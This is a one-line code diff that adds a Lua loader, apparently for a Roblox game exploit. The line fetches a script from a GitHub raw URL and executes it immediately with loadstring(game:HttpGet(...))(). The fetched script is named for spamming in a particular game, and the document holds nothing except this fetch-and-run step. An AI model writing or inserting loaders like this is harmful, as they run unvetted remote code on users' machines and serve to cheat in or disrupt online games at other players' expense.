@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/bunker-vs-verity-spam2-dm6wd6frfzyh99.lua"))()
